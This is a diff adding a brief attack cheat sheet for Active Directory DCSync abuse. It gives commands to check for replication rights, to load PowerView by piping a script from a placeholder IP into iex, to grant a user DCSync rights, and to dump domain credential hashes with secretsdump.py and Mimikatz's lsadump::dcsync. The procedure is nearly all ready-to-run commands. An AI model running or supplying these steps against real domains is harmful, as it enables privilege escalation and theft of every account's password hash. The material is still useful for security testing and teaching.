@@ -1,0 +1,19 @@
+To check if a user have dcsync rights:
+Import-Module ActiveDirectory
+(Get-Acl "ad:\dc={DOMAIN BEFORE .},dc={DOMAIN AFTER .}").Access | ? {$_.IdentityReference -and ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) }
+
+
+If you can grant user dcsync rights:
+PowerView.ps1 (dev fork)
+
+Import-Module ./PowerView.ps1 or curl http://{IP}/PowerView.ps1 | iex
+Add-DomainObjectAcl -TargetIdentity "DC={DOMAIN},DC={DOMAIN AFTER .}" -PrincipalIdentity {USER} -Rights DCSync
+
+You can grant more rights with that.
+
+After that you can secretsdump remotely or mimikatz:
+
+secretsdump.py -just-dc {DOMAIN}/{USER}@{IP-DC} 
+
+Get the user hash with mimikatz on windows
+Invoke-Mimikatz -Command "lsadump::dcsync /user:{USER}"
